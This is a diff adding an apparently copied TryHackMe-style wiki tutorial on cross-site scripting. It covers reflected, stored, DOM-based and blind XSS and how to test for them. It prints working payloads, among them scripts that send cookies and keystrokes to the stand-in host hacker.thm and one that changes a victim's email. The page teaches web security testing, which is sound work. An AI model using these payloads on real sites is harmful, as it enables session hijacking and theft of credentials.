@@ -1,0 +1,92 @@
+<!--
+title: XSS
+description: 
+published: true
+date: 2022-10-26T08:54:22.813Z
+tags: 
+editor: ckeditor
+dateCreated: 2022-10-26T08:52:27.807Z
+-->
+
+<h1>Introduction</h1>
+<p>It's worth noting that because XSS is based on JavaScript, it would be helpful to have a basic understanding of the language. However, none of the examples is overly complicated—also, a basic understanding of Client-Server requests and responses.</p>
+<p>Cross-Site Scripting, better known as XSS in the cybersecurity community, is classified as an injection attack where malicious JavaScript gets injected into a web application with the intention of being executed by other users. In this room, you'll learn about the different XSS types, how to create XSS payloads, how to modify your payloads to evade filters, and then end with a practical lab where you can try out your new skills.</p>
+<p>Cross-site scripting vulnerabilities are extremely common. Below are a few reports of XSS found in massive applications; you can get paid very well for finding and reporting these vulnerabilities.&nbsp;&nbsp;</p>
+<ul>
+  <li><a href="https://hackerone.com/reports/415484">XSS found in Shopify</a></li>
+  <li><a href="https://hackerone.com/reports/409850">$7,500 for XSS found in Steam chat</a></li>
+  <li><a href="https://hackerone.com/reports/449351">$2,500 for XSS in HackerOne</a></li>
+  <li><a href="https://hackerone.com/reports/283825">XSS found in Infogram</a></li>
+</ul>
+<h1>XSS Payloads</h1>
+<p><strong>What is a payload?</strong></p>
+<p>In XSS, the payload is the JavaScript code we wish to be executed on the targets computer. There are two parts to the payload, the intention and the modification.</p>
+<p>The intention is what you wish the JavaScript to actually do (which we'll cover with some examples below), and the modification is the changes to the code we need to make it execute as every scenario is different (more on this in the perfecting your payload task).</p>
+<p>Here are some examples of XSS intentions.</p>
+<p><strong>Proof Of Concept:</strong></p>
+<p>This is the simplest of payloads where all you want to do is demonstrate that you can achieve XSS on a website. This is often done by causing an alert box to pop up on the page with a string of text, for example:</p>
+<p><code>&lt;script&gt;alert('XSS');&lt;/script&gt;</code></p>
+<p><strong>Session Stealing:</strong></p>
+<p>Details of a user's session, such as login tokens, are often kept in cookies on the targets machine. The below JavaScript takes the target's cookie, base64 encodes the cookie to ensure successful transmission and then posts it to a website under the hacker's control to be logged. Once the hacker has these cookies, they can take over the target's session and be logged as that user.</p>
+<p><code>&lt;script&gt;fetch('https://hacker.thm/steal?cookie=' + btoa(document.cookie));&lt;/script&gt;</code></p>
+<p><strong>Key Logger:</strong></p>
+<p>The below code acts as a key logger. This means anything you type on the webpage will be forwarded to a website under the hacker's control. This could be very damaging if the website the payload was installed on accepted user logins or credit card details.</p>
+<p><code>&lt;script&gt;document.onkeypress = function(e) { fetch('https://hacker.thm/log?key=' + btoa(e.key) );}&lt;/script&gt;</code></p>
+<p><strong>Business Logic:</strong></p>
+<p>This payload is a lot more specific than the above examples. This would be about calling a particular network resource or a JavaScript function. For example, imagine a JavaScript function for changing the user's email address called <code>user.changeEmail()</code>. Your payload could look like this:</p>
+<p><code>&lt;script&gt;user.changeEmail('attacker@hacker.thm');&lt;/script&gt;</code></p>
+<p>Now that the email address for the account has changed, the attacker may perform a reset password attack.<br>The next four tasks are going to cover the different types of XSS Vulnerabilities, all requiring slightly different attack payloads and user interaction.</p>
+<h1>Reflected XSS</h1>
+<p>Reflected XSS happens when user-supplied data in an HTTP request is included in the webpage source without any validation.</p>
+<p><strong>Example Scenario:</strong><br>A website where if you enter incorrect input, an error message is displayed. The content of the error message gets taken from the <strong>error</strong> parameter in the query string and is built directly into the page source.</p>
+<figure class="image"><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5efe36fb68daf465530ca761/room-content/a5b0dbc4d2f1f69988f82f2c5d53f6ed.png"></figure>
+<p><br>&nbsp;</p>
+<figure class="image"><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5efe36fb68daf465530ca761/room-content/7f90b73106d655b07874943f93533f7b.png"></figure>
+<p>The application doesn't check the contents of the <strong>error</strong> parameter, which allows the attacker to insert malicious code.</p>
+<figure class="image"><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5efe36fb68daf465530ca761/room-content/66743e9fa50b4c5793f070eb505f72d1.png"></figure>
+<figure class="image"><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5efe36fb68daf465530ca761/room-content/24e50d95cecfc3783bd1a3a4fecbf310.png"></figure>
+<p>The vulnerability can be used as per the scenario in the image below:</p>
+<figure class="image image_resized" style="width:672.625px;"><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5efe36fb68daf465530ca761/room-content/8e3bffe500771c03366de569c3565058.png"></figure>
+<p><strong>Potential Impact:</strong><br>The attacker could send links or embed them into an iframe on another website containing a JavaScript payload to potential victims getting them to execute code on their browser, potentially revealing session or customer information.</p>
+<p><strong>How to test for Reflected XSS:</strong></p>
+<p>You'll need to test every possible point of entry; these include:</p>
+<ul>
+  <li>Parameters in the URL Query String</li>
+  <li>URL File Path</li>
+  <li>Sometimes HTTP Headers (although unlikely exploitable in practice)</li>
+</ul>
+<p>Once you've found some data which is being reflected in the web application, you'll then need to confirm that you can successfully run your JavaScript payload; your payload will be dependent on where in the application your code is reflected (you'll learn more about this in task 6).</p>
+<h1>Stored XSS</h1>
+<p>As the name infers, the XSS payload is stored on the web application (in a database, for example) and then gets run when other users visit the site or web page.<br><br><strong>Example Scenario:</strong><br><br>A blog website that allows users to post comments. Unfortunately, these comments aren't checked for whether they contain JavaScript or filter out any malicious code. If we now post a comment containing JavaScript, this will be stored in the database, and every other user now visiting the article will have the JavaScript run in their browser.</p>
+<p>&nbsp;</p>
+<figure class="image image_resized" style="width:818.5px;"><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5efe36fb68daf465530ca761/room-content/cc2566d297f7328d91bc8552f902210e.png"></figure>
+<p><strong>Potential Impact:</strong><br>The malicious JavaScript could redirect users to another site, steal the user's session cookie, or perform other website actions while acting as the visiting user.</p>
+<p><strong>How to test for Stored XSS:</strong></p>
+<p>You'll need to test every possible point of entry where it seems data is stored and then shown back in areas that other users have access to; a small example of these could be:</p>
+<ul>
+  <li>Comments on a blog</li>
+  <li>User profile information</li>
+  <li>Website Listings</li>
+</ul>
+<p>Sometimes developers think limiting input values on the client-side is good enough protection, so changing values to something the web application wouldn't be expecting is a good source of discovering stored XSS, for example, an age field that is expecting an integer from a dropdown menu, but instead, you manually send the request rather than using the form allowing you to try malicious payloads.&nbsp;</p>
+<p>Once you've found some data which is being stored in the web application,&nbsp; you'll then need to confirm that you can successfully run your JavaScript payload; your payload will be dependent on where in the application your code is reflected (you'll learn more about this in task 6).</p>
+<h1>DOM Based XSS</h1>
+<p><strong>What is the DOM?</strong></p>
+<p>DOM stands for <strong>D</strong>ocument <strong>O</strong>bject <strong>M</strong>odel and is a programming interface for HTML and XML documents. It represents the page so that programs can change the document structure, style and content. A web page is a document, and this document can be either displayed in the browser window or as the HTML source. A diagram of the HTML DOM is displayed below:</p>
+<figure class="image"><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5efe36fb68daf465530ca761/room-content/24a54ac532b5820bf0ffdddf00ab2247.png"></figure>
+<p>If you want to learn more about the DOM and gain a deeper understanding <a href="https://www.w3.org/TR/REC-DOM-Level-1/introduction.html">w3.org</a> have a great resource.</p>
+<p><strong>Exploiting the DOM</strong><br>DOM Based XSS is where the JavaScript execution happens directly in the browser without any new pages being loaded or data submitted to backend code. Execution occurs when the website JavaScript code acts on input or user interaction.</p>
+<p><strong>Example Scenario:</strong><br>The website's JavaScript gets the contents from the <code>window.location.hash</code> parameter and then writes that onto the page in the currently being viewed section. The contents of the hash aren't checked for malicious code, allowing an attacker to inject JavaScript of their choosing onto the webpage.</p>
+<p><strong>Potential Impact:</strong><br>Crafted links could be sent to potential victims, redirecting them to another website or steal content from the page or the user's session.</p>
+<p><strong>How to test for Dom Based XSS:</strong></p>
+<p>DOM Based XSS can be challenging to test for and requires a certain amount of knowledge of JavaScript to read the source code. You'd need to look for parts of the code that access certain variables that an attacker can have control over, such as "<strong>window.location.x</strong>" parameters.</p>
+<p>When you've found those bits of code, you'd then need to see how they are handled and whether the values are ever written to the web page's DOM or passed to unsafe JavaScript methods such as <strong>eval()</strong>.</p>
+<h1>Blind XSS</h1>
+<p>Blind XSS is similar to a stored XSS (which we covered in task 4) in that your payload gets stored on the website for another user to view, but in this instance, you can't see the payload working or be able to test it against yourself first.</p>
+<p><strong>Example Scenario:</strong></p>
+<p>A website has a contact form where you can message a member of staff. The message content doesn't get checked for any malicious code, which allows the attacker to enter anything they wish. These messages then get turned into support tickets which staff view on a private web portal.</p>
+<p><strong>Potential Impact:</strong></p>
+<p>Using the correct payload, the attacker's JavaScript could make calls back to an attacker's website, revealing the staff portal URL, the staff member's cookies, and even the contents of the portal page that is being viewed. Now the attacker could potentially hijack the staff member's session and have access to the private portal.</p>
+<p><strong>How to test for Blind XSS:</strong></p>
+<p>When testing for Blind XSS vulnerabilities, you need to ensure your payload has a call back (usually an HTTP request). This way, you know if and when your code is being executed.</p>
+<p>A popular tool for Blind XSS attacks is <a href="https://xsshunter.com/">xsshunter</a>. Although it's possible to make your own tool in JavaScript, this tool will automatically capture cookies, URLs, page contents and more.</p>
